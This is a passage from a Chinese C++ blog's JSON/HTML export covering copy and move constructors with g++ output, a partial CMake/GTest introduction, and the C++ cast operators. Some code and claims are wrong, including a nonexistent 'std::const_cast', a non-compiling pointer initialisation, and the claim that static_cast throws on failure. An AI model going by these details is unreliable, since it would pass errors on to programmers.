<span class=\"built_in\">matrix</span>(std::initializer_list&lt;std::initializer_list&lt;<span class=\"keyword\">double</span>&gt;&gt; list);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">matrix</span>(matrix&amp; m);</span><br><span class=\"line\">    <span class=\"built_in\">matrix</span>(matrix&amp;&amp; m);</span><br><span class=\"line\">    ~<span class=\"built_in\">matrix</span>();</span><br><span class=\"line\">    matrix&amp; <span class=\"keyword\">operator</span> = (matrix&amp; m);</span><br><span class=\"line\">    matrix&amp; <span class=\"keyword\">operator</span> = (matrix&amp;&amp; m);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure><br>构造函数：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// matrix.cpp</span></span><br><span class=\"line\">matrix::<span class=\"built_in\">matrix</span>(<span class=\"keyword\">int</span> r, <span class=\"keyword\">int</span> c, <span class=\"keyword\">double</span> v): <span class=\"built_in\">nrow</span>(r), <span class=\"built_in\">ncol</span>(c) </span><br><span class=\"line\">&#123;   </span><br><span class=\"line\">  std::cout &lt;&lt; <span class=\"string\">&quot;construct&quot;</span> &lt;&lt; <span class=\"keyword\">this</span> &lt;&lt; std::endl;</span><br><span class=\"line\">  value = <span class=\"keyword\">new</span> <span class=\"keyword\">double</span>[r * c];</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r * c; i++) &#123;</span><br><span class=\"line\">      value[i] = v;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">matrix::<span class=\"built_in\">matrix</span>(initializer_list&lt;initializer_list&lt;<span class=\"keyword\">double</span>&gt;&gt; list) &#123;</span><br><span class=\"line\">  std::cout &lt;&lt; <span class=\"string\">&quot;construct&quot;</span> &lt;&lt; <span class=\"keyword\">this</span> &lt;&lt; std::endl;</span><br><span class=\"line\">  nrow = list.<span class=\"built_in\">size</span>();</span><br><span class=\"line\">  ncol = list.<span class=\"built_in\">begin</span>()-&gt;<span class=\"built_in\">size</span>();</span><br><span class=\"line\">  value = <span class=\"keyword\">new</span> <span class=\"keyword\">double</span>[nrow * ncol];</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> rowit = list.<span class=\"built_in\">begin</span>(); rowit != list.<span class=\"built_in\">end</span>(); rowit++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = rowit-&gt;<span class=\"built_in\">begin</span>(); it != rowit-&gt;<span class=\"built_in\">end</span>(); it++) &#123;</span><br><span class=\"line\">        value[i++] = *it;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"拷贝构造函数\"><a href=\"#拷贝构造函数\" class=\"headerlink\" title=\"拷贝构造函数\"></a>拷贝构造函数</h3><p>拷贝构造函数定义了当用同类型的另一个对象初始化新对象时做什么。拷贝构造没有显示定义时，编译器会隐式定义一个默认的拷贝构造函数，对<strong>栈上</strong>成员<strong>逐字节拷贝</strong>。</p>\n<p>如果类的成员变量含有指向堆的指针，一般就需要手动实现拷贝构造函数：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// matrix.cpp</span></span><br><span class=\"line\">matrix::<span class=\"built_in\">matrix</span>(<span class=\"keyword\">const</span> matrix&amp; m) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  std::cout &lt;&lt; <span class=\"string\">&quot;copy construct &quot;</span> &lt;&lt; <span class=\"keyword\">this</span> &lt;&lt; std::endl;</span><br><span class=\"line\">  nrow = m.nrow;</span><br><span class=\"line\">  ncol = m.ncol;</span><br><span class=\"line\">  value = <span class=\"keyword\">new</span> <span class=\"keyword\">double</span>[nrow * ncol]; <span class=\"comment\">// 分配新堆空间</span></span><br><span class=\"line\">  <span class=\"built_in\">memcpy</span>(value, m.value, <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(<span class=\"keyword\">double</span>) * nrow * ncol); <span class=\"comment\">// 拷贝堆上数据</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>拷贝构造的确定的调用场景：</p>\n<ol>\n<li><p>显式地从<strong>左值对象</strong>构造新对象</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">matrix a;</span><br><span class=\"line\"><span class=\"function\">matrix <span class=\"title\">b</span><span class=\"params\">(a)</span></span>;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>初始化新对象，使用<strong>左值对象</strong>向其赋值：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">matrix a;</span><br><span class=\"line\">matrix b = a;</span><br></pre></td></tr></table></figure>\n<p>可以看作是将左值引用<code>a</code>绑定到构造结果上。</p>\n</li>\n</ol>\n<h3 id=\"拷贝赋值运算符\"><a href=\"#拷贝赋值运算符\" class=\"headerlink\" title=\"拷贝赋值运算符\"></a>拷贝赋值运算符</h3><p>拷贝赋值运算符定义了将一个对象赋予同类型的另一个对象时做什么。赋值运算符只能重载为成员，不能重载为友元。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// matrix.cpp</span></span><br><span class=\"line\">matrix&amp; matrix::<span class=\"keyword\">operator</span> = (<span class=\"keyword\">const</span> matrix&amp; m) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  std::cout &lt;&lt; <span class=\"string\">&quot;assign operator &quot;</span> &lt;&lt; <span class=\"keyword\">this</span> &lt;&lt; std::endl;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span> != &amp;m) <span class=\"comment\">// 不是自身赋给自身</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    nrow = m.nrow;</span><br><span class=\"line\">    ncol = m.ncol;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span>[] value;</span><br><span class=\"line\">    value = <span class=\"keyword\">new</span> <span class=\"keyword\">double</span>[nrow * ncol];</span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(value, m.value, <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(<span class=\"keyword\">double</span>) * nrow * ncol);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *<span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>拷贝赋值确定的调用场景：</p>\n<ol>\n<li>给左值对象赋左值<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">matrix a, b;</span><br><span class=\"line\">a = b;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"析构函数\"><a href=\"#析构函数\" class=\"headerlink\" title=\"析构函数\"></a>析构函数</h3><p>析构函数定义了此类型的对象销毁时做什么。在析构函数中往往需要手动销毁堆上数据。<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// matrix.cpp</span></span><br><span class=\"line\">matrix::~<span class=\"built_in\">matrix</span>() &#123;</span><br><span class=\"line\">  <span class=\"keyword\">delete</span>[] value; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<ul>\n<li>一般来说不能私有化(<code>private</code>)或者<code>~matrix() = 0</code>屏蔽析构函数，这会导致对象无法被销毁，即：栈上定义对象会编译错误。但是可以使用<code>new</code>在堆上分配对象</li>\n</ul>\n</blockquote>\n<h3 id=\"移动构造函数\"><a href=\"#移动构造函数\" class=\"headerlink\" title=\"移动构造函数\"></a>移动构造函数</h3><p>移动构造是从一个临时对象（右值引用）中构造对象。<strong>移动构造往往是写成浅拷贝</strong>，直接复制临时对象的指针成员，并将原来的指针置为<code>nullptr</code>。<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// matrix.cpp</span></span><br><span class=\"line\">matrix::<span class=\"built_in\">matrix</span>(matrix&amp;&amp; m):<span class=\"built_in\">ncol</span>(m.ncol), <span class=\"built_in\">nrow</span>(m.nrow) &#123;</span><br><span class=\"line\">  std::cout &lt;&lt; <span class=\"string\">&quot;move construct &quot;</span> &lt;&lt; <span class=\"keyword\">this</span> &lt;&lt; std::endl;</span><br><span class=\"line\">  value = m.value;</span><br><span class=\"line\">  m.value = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>移动构造发生在：</p>\n<ol>\n<li><p>将函数返回值绑定到新定义的对象上</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">matrix a = matrix::<span class=\"built_in\">zero</span>(<span class=\"number\">3</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用函数返回值显式的初始化对象</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">matrix <span class=\"title\">a</span><span class=\"params\">(matrix::zero(<span class=\"number\">3</span>))</span></span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<blockquote>\n<p>由于<code>matrix::matrix(matrix&amp;&amp; m)</code>被定义，所以移动构造会优先使用该方法。如果<code>matrix::matrix(matrix&amp;&amp; m)</code>未定义，则会寻找常引用参数的拷贝构造<code>matrix::matrix(const matrix&amp; m)</code>，如果拷贝构造参数不为常引用，则找不到合适的构造方法，编译器报错。</p>\n</blockquote>\n<h3 id=\"移动赋值运算符\"><a href=\"#移动赋值运算符\" class=\"headerlink\" title=\"移动赋值运算符\"></a>移动赋值运算符</h3><p>移动复制运算符定义了将一个临时右值对象赋予同类型的另一个左值对象时做什么。和移动构造同理，一般也是浅拷贝。<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// matrix.cpp</span></span><br><span class=\"line\">matrix&amp; matrix::<span class=\"keyword\">operator</span> = (matrix&amp;&amp; m) &#123;</span><br><span class=\"line\">  std::cout &lt;&lt; <span class=\"string\">&quot;move assign operator &quot;</span> &lt;&lt; <span class=\"keyword\">this</span> &lt;&lt; std::endl;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"keyword\">this</span> != &amp;m) &#123;</span><br><span class=\"line\">    nrow = m.nrow;</span><br><span class=\"line\">    ncol = m.ncol;</span><br><span class=\"line\">    value = m.value;</span><br><span class=\"line\">    m.value = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *<span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>移动赋值发生在：</p>\n<ol>\n<li>将函数返回值赋给初始化后的左值对象<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">matrix a;</span><br><span class=\"line\">a = matrix::<span class=\"built_in\">zero</span>(<span class=\"number\">3</span>);</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<blockquote>\n<p>由于<code>matrix&amp; matrix::operator = (matrix&amp;&amp; m)</code>被定义，所以移动赋值运算符会优先使用该方法。如果<code>matrix&amp; matrix::operator = (matrix&amp;&amp; m)</code>未定义，则会寻找常引用参数的拷贝赋值<code>matrix&amp; matrix::operator = (const matrix&amp; m)</code>，如果拷贝赋值参数不为常引用，则找不到合适的赋值方法，编译器报错。</p>\n<ul>\n<li>五种方法的实现往往是同时的，即要么都要实现，要么都不用实现，关键是判断<strong>类中是否出现了指针类型的成员</strong>。如果类中出现了指针类型的成员，往往需要同时实现五种方法来区分深浅拷贝，反之五种方法都可以使用默认实现。</li>\n</ul>\n</blockquote>\n<h2 id=\"拷贝-VS-移动\"><a href=\"#拷贝-VS-移动\" class=\"headerlink\" title=\"拷贝 VS 移动\"></a>拷贝 VS 移动</h2><p>声明一个静态成员函数用于创建零矩阵：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// matrix.cpp</span></span><br><span class=\"line\"><span class=\"comment\">// 创建零矩阵</span></span><br><span class=\"line\"><span class=\"function\">matrix <span class=\"title\">matrix::zero</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">matrix</span>(n, n, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>他会调用一个<code>matrix(int, int, int)</code>构造函数然后返回。在<code>main()</code>中调用这个函数观察对象的生命周期：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// main.cpp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  matrix E = matrix::<span class=\"built_in\">zero</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"拷贝构造\"><a href=\"#拷贝构造\" class=\"headerlink\" title=\"拷贝构造\"></a>拷贝构造</h3><p>如果<strong>取消移动构造的手动实现</strong>，仅保留拷贝构造，在Linux上用<code>g++ -fno-elide-constructors -std=c++11</code>编译，输出如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ g++ matrix.cpp main.cpp -fno-elide-constructors -std=c++11 -o main &amp;&amp; ./main</span><br><span class=\"line\">construct 0x7ffc8b9b8eb0</span><br><span class=\"line\">copy construct 0x7ffc8b9b8f00</span><br><span class=\"line\">destruct 0x7ffc8b9b8eb0</span><br><span class=\"line\">copy construct 0x7ffc8b9b8ef0</span><br><span class=\"line\">destruct 0x7ffc8b9b8f00</span><br><span class=\"line\">destruct 0x7ffc8b9b8ef0</span><br></pre></td></tr></table></figure><br>全程共1次构造（涉及堆上空间分配），2次拷贝构造（深拷贝，涉及堆上空间分配）。该情况下出现两次深拷贝，如果对象特别大，就容易产生性能问题。</p>\n<p><code>matrix::zero(int)</code>中首先调用了<code>matrix::matrix(int, int, int)</code>构造了一个匿名的右值<code>matrix</code>对象<code>0x7ffc8b9b8eb0</code>，然后<code>return</code>复制这个右值对象时发现只能绑定拷贝构造的参数（<code>const matrix&amp;</code>可以绑定<code>matrix&amp;&amp;</code>），创建了一个新的临时对象<code>0x7ffc8b9b8f00</code>，随后原先的<code>0x7ffc8b9b8eb0</code>随着函数返回析构，而<code>0x7ffc8b9b8f00</code>作为右值被返回，返回值在<code>main()</code>中被用于构造<code>E</code>对象<code>0x7ffc8b9b8ef0</code>，函数调用返回值<code>0x7ffc8b9b8f00</code>和<code>0x7ffc8b9b8ef0</code>随着<code>main()</code>函数的结束被析构。</p>\n<blockquote>\n<ul>\n<li><p>取消移动构造的实现不是指<code>= default</code>，显示声明默认实现实际上制定的行为是快拷贝，会导致原有的指针不被置为<code>nullptr</code>，从而出现<code>double free</code></p>\n</li>\n<li><p>编译选项<code>-fno-elide-constructors</code>可以禁止编译器优化构造函数，需要注意的是，这个选项只在<code>C++11</code>前有效，<code>C++17</code>及以后必须要求编译器开启构造函数优化，该选项已经不起作用。</p>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"移动构造\"><a href=\"#移动构造\" class=\"headerlink\" title=\"移动构造\"></a>移动构造</h3><p>移动语义指的就是将其他对象（通常是临时对象）拥有的内存资源“移为已用”。这里有些类似Rust中<em>Move</em>的概念，区别是Rust中<em>Move</em>会屏蔽原有的对象，在编译阶段做检查；而C++则需要手动去实现移动构造，把原对象的指针成员置空，移动构造完成后的远对象也不能再去使用。</p>\n<p>恢复之前写的移动构造，继续使用<code>-fno-elide-constructors -std=c++11</code>选项编译运行，输出如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ g++ matrix.cpp main.cpp -fno-elide-constructors -std=c++11 -o main &amp;&amp; ./main</span><br><span class=\"line\">construct 0x7ffc3393b6b0</span><br><span class=\"line\">move construct 0x7ffc3393b700</span><br><span class=\"line\">destruct 0x7ffc3393b6b0</span><br><span class=\"line\">move construct 0x7ffc3393b6f0</span><br><span class=\"line\">destruct 0x7ffc3393b700</span><br><span class=\"line\">destruct 0x7ffc3393b6f0</span><br></pre></td></tr></table></figure><br>全程共1次构造（涉及堆上空间分配），2次移动构造（浅拷贝，使得原有指针失效，无堆上空间分配），相较之前拷贝构造的场景大大提升了性能。</p>\n<p><code>matrix::zero(int)</code>中首先调用了<code>matrix::matrix(int, int, int)</code>构造了一个匿名的右值<code>matrix</code>对象<code>0x7ffc3393b6b0</code>，然后<code>return</code>这个对象调用了移动构造，创建了一个新的临时对象<code>0x7ffc3393b700</code>，随后原先的<code>0x7ffc3393b6b0</code>随着函数返回析构，而<code>0x7ffc3393b700</code>作为右值被返回，返回值在<code>main()</code>中被用于构造<code>E</code>对象<code>0x7ffc3393b6f0</code>，函数调用返回值<code>0x7ffc3393b700</code>和<code>0x7ffc3393b6f0</code>随着<code>main()</code>函数的结束被析构。</p>\n<h3 id=\"RVO\"><a href=\"#RVO\" class=\"headerlink\" title=\"RVO\"></a>RVO</h3><p>如今的编译器往往都对上述场景做了优化，无论是否声明移动构造，如果不指定<code>-fno-elide-constructors</code>，编译器会默认开启RVO(Return Value Optimzation)，编译器会去除获取对象返回值时候重复的构造、移动和析构，全程只有一次构造和析构，这种情况下输出如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ g++ matrix.cpp main.cpp -o main &amp;&amp; ./main</span><br><span class=\"line\">construct 0x7ffdb5e53ce0</span><br><span class=\"line\">destruct 0x7ffdb5e53ce0</span><br></pre></td></tr></table></figure></p>\n<p><strong>当类中同时包含拷贝构造函数和移动构造函数时，如果使用临时对象初始化当前类的对象，编译器会优先调用移动构造函数来完成此操作。只有当类中没有合适的移动构造函数时，编译器才会退而求其次，调用拷贝构造函数。</strong> 所以一般拷贝构造参数声明为<code>const</code>，这是因为常左值引用是万能引用，可以绑定右值。</p>\n<p>实际开发中一般定义移动构造时也会定义拷贝构造，对于右值使用移动构造，对于左值使用拷贝构造。如果想将左值也用于移动构造，可以使用<code>std::move()</code>把左值强转为右值，被<code>std::move()</code>调用后参与移动构造的对象将会失效，<strong>要避免使用被移动过的对象，以免产生不可预料的后果</strong>。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">std::string str = <span class=\"string\">&quot;Hello World&quot;</span>;</span><br><span class=\"line\">std::string str2 = std::<span class=\"built_in\">move</span>(str);</span><br><span class=\"line\">std::cout &lt;&lt; str.<span class=\"built_in\">empty</span>() &lt;&lt; std::endl; <span class=\"comment\">// 不建议再使用str</span></span><br><span class=\"line\">std::cout &lt;&lt; str2 &lt;&lt; std::endl; </span><br><span class=\"line\"><span class=\"comment\">// 输出：</span></span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"comment\">// Hello World</span></span><br></pre></td></tr></table></figure>\n<p>一般拷贝构造和移动构造都存在的时候，<code>std::move()</code>存在的意义是显式指定一个对象进行移动构造来提升性能。</p>\n<p>完整代码见：<a href=\"http://github.com/XUranus/demo/c++/matrix\">http://github.com/XUranus/demo/c++/matrix</a></p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://stackoverflow.com/questions/10363646/compiling-c11-with-g\">Compiling C++11 with g++</a></li>\n<li><a href=\"https://splichal.eu/gccsphinx-final/html/gcc/gcc-command-options/options-controlling-c%2B%2B-dialect.html\">Using the GNU Compiler Collection</a></li>\n<li><a href=\"https://stackoverflow.com/questions/27086573/when-and-why-would-i-use-fno-elide-constructors\">When and why would I use -fno-elide-constructors?</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000016041544\">我理解的右值引用、移动语义和完美转发</a></li>\n</ul>\n","categories":["C++之左值右值"],"tags":["CPP"]},{"title":"CMake集成GTest","url":"/2022/06/27/CMake%E9%9B%86%E6%88%90gtest/","content":"<blockquote>\n<p>第一次接触到较打的C++项目，项目由CMake构建，并使用GTest测试，而我之前对CMake的认知仅仅是Clion提供的自动创建和修改<code>CMakeList.txt</code>，对C++测试仅仅停留在写宏定义和测试用例，对LLT测试框架完全没有映像。搞懂项目的构建原理有利于尽快上手项目，于是打算在本文梳理一下CMake和GTest的基本用法，完整实现一个集成CMake和GTest的项目。</p>\n</blockquote>\n<span id=\"more\"></span>\n<h2 id=\"CMake\"><a href=\"#CMake\" class=\"headerlink\" title=\"CMake\"></a>CMake</h2><p>C源文件可以用<code>gcc</code>编译，但是文件一旦多了编译的命令也就复杂了，这时候引入Makefile组织项目文件编译，但是Makefile更偏向与机器语言，可读性差、难以维护，且不能兼容qmake\\nmake等其他构建工具。</p>\n<p><strong>CMake</strong>（Cross platfrom Make）是一款支持<strong>多平台</strong>的<strong>开源</strong>的C项目构建工具，支持生成多平台的构建文件。</p>\n<pre class=\"mermaid\">flowchart LR\n  CMakeLists.txt --CMake--> Makefile --make--> id1((Unix ELF))\n  CMakeLists.txt --CMake, qmake--> id2((Qt Release))\n  CMakeLists.txt --CMake, nmake--> id3((MSVC EXE))</pre>\n\n<h3 id=\"工程样例\"><a href=\"#工程样例\" class=\"headerlink\" title=\"工程样例\"></a>工程样例</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">- src/</span><br><span class=\"line\">- include/</span><br><span class=\"line\">- protocol/</span><br><span class=\"line\">- build/</span><br><span class=\"line\">- bin/</span><br></pre></td></tr></table></figure>\n<p>一般一个CMake项目根目录会有一个<code>build</code>目录，用于存放构建过程中产生的临时文件，例如：外部依赖编译产生的静态/动态库，内部模块构建产生的静态/动态库。这种方式称为<strong>外部构建</strong>，可以防止构建过程污染项目空间。</p>\n<h3 id=\"CMakeList-txt\"><a href=\"#CMakeList-txt\" class=\"headerlink\" title=\"CMakeList.txt\"></a>CMakeList.txt</h3><figure class=\"highlight cmake\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cmake_minimum_required</span>(VERSION <span class=\"number\">3.12</span>)</span><br><span class=\"line\"><span class=\"keyword\">project</span>(snake)</span><br><span class=\"line\"><span class=\"keyword\">message</span>(<span class=\"string\">&quot;building $&#123;PROJECT_NAME&#125; to &quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">set</span>(CMAKE_CXX_STANDARD <span class=\"number\">11</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">option</span>(EXCUTABLE_PATH $PROJECT_SOURCE_DIR/bin)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">add_subdirectory</span>(protocol)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">add_executable</span>(snake_server</span><br><span class=\"line\"></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">TARGET_LINK_LIBRARIES</span>(snake_server pthread curses protobuf)</span><br></pre></td></tr></table></figure>\n<p>相关指令：</p>\n<ul>\n<li><code>cmake_minimum_required</code>设置CMake最小版本号要求</li>\n<li><code>project</code>声明工程名称</li>\n<li><code>set</code>用于定义变量，<code>option</code>用于，变量可用EL表达式获得</li>\n<li><code>add_subdirectory</code>用于引入子构建目录，会去加载该位置的CMakeLists.txt，子构建目录可以多层嵌套</li>\n<li><code>if() else()</code>选择分支</li>\n</ul>\n<h2 id=\"GTest\"><a href=\"#GTest\" class=\"headerlink\" title=\"GTest\"></a>GTest</h2><h2 id=\"GMock\"><a href=\"#GMock\" class=\"headerlink\" title=\"GMock\"></a>GMock</h2>","tags":["CMake"]},{"title":"C++中的几种cast","url":"/2022/08/15/CPP%E4%B8%AD%E7%9A%84%E5%87%A0%E7%A7%8Dcast/","content":"<p>C++虽然集成了C语言的explict cast和implict cast策略，但是作为一门更现代的语言，C++额外提供了一些类型检查，如检查指针和基础类型的转换，基类和派生类的转换等来提高编程的安全性。<br>主要有<code>const_cast</code>,<code>reinterpret_cast</code>,<code>static_cast</code>,<code>dynamic_cast</code>。其中<code>const_cast</code>主要用于处理<code>const</code>修饰，功能单一，可以看作一类，其他三类可以看作另一类。</p>\n<h2 id=\"const-cast\"><a href=\"#const-cast\" class=\"headerlink\" title=\"const_cast\"></a>const_cast</h2><p><code>const_cast</code>一般用于强制修改一个类型的<strong>读写权限</strong>，例如实现常量到变量引用的转换，以实现修改一些常量的目的。<strong>强制转换的类型必须是指针或引用。</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> v = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> &amp;mutv = std::<span class=\"keyword\">const_cast</span>&lt;<span class=\"keyword\">int</span>&amp;&gt;(v);</span><br><span class=\"line\">mutv++;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> *p = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> *mutp = std::<span class=\"keyword\">const_cast</span>&lt;<span class=\"keyword\">int</span>*&gt;(p);</span><br><span class=\"line\">(*mutp)++;</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<h2 id=\"reinterpret-cast\"><a href=\"#reinterpret-cast\" class=\"headerlink\" title=\"reinterpret_cast\"></a>reinterpret_cast</h2><p>几乎什么都可以转，可以看作是<strong>内存层面的转化</strong>，是最为接近C风格的<strong>强制转换</strong>。<code>reinterpret_cast</code>在<code>static_cast</code>基础上支持更<strong>宽松</strong>的类型转换，例如支持指针和基础类型的相互转换。</p>\n<p>它的机制是对二进制数据进行重新的解释，不会改变原来的格式，而<code>static_cast</code>则会改变原来的格式。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = <span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *ptr = <span class=\"keyword\">reinterpret_cast</span>&lt;<span class=\"keyword\">void</span>*&gt;(i); <span class=\"comment\">// int =&gt; void*</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>由于<code>reinterpret_cast</code>是二进制层面上的转化，不考虑转化后的数据是否有意义，不会主动抛出异常。这类强制转换表面上看起来功能强大什么都能转，但是转化不够明确，不能进行错误检查，容易出错，所以尽可能不要用</p>\n</blockquote>\n<h2 id=\"static-cast\"><a href=\"#static-cast\" class=\"headerlink\" title=\"static_cast\"></a>static_cast</h2><p><code>static_cast</code>是在<strong>编译阶段</strong>实现的<strong>静态映射</strong>，用于各类<strong>隐式转换</strong>，如果<strong>转化失败会抛出异常</strong></p>\n<ul>\n<li>非<code>const</code>和<code>const</code>类之间的相互转换</li>\n<li>基础类型<code>int</code>,<code>unsigned int</code>,<code>float</code>之间的相互转换，转换符合C的转换规则。</li>\n<li>任何指针类之间的相互转换</li>\n<li>将任何类型转化为<code>void</code>类型</li>\n<li>对于多态，只支持派生类的<strong>值</strong>向基类的<strong>值</strong>的<strong>单向</strong>转化。（如果是指针，可以双向转换，但是不安全。）</li>\n</ul>\n<blockquote>\n<ul>\n<li>如果子类不包含额外成员，也支持用<code>static_cast</code>进行基类到子类的转换</li>\n<li>不支持指针和基础类型(<code>int</code>,<code>float</code>)等之间的相互转换</li>\n</ul>\n</blockquote>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Base</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span>:</span><br><span class=\"line\">        <span class=\"built_in\">Base</span>() &#123; std::cout &lt;&lt; <span class=\"string\">&quot;Base construct&quot;</span> &lt;&lt; std::endl;&#125;</span><br><span class=\"line\">        <span class=\"built_in\">Base</span>(<span class=\"keyword\">const</span> Base&amp; base) &#123; std::cout &lt;&lt; <span class=\"string\">&quot;Base copy construct&quot;</span> &lt;&lt; std::endl;&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Derive</span>:</span> <span class=\"keyword\">public</span> Base &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>:</span><br><span class=\"line\">        <span class=\"built_in\">Derive</span>() &#123; std::cout &lt;&lt; <span class=\"string\">&quot;Derive construct&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class=\"line\">        <span class=\"built_in\">Derive</span>(<span class=\"keyword\">const</span> Derive&amp; derive) &#123; std::cout &lt;&lt; <span class=\"string\">&quot;Derive copy construct&quot;</span> &lt;&lt; std::endl;&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span 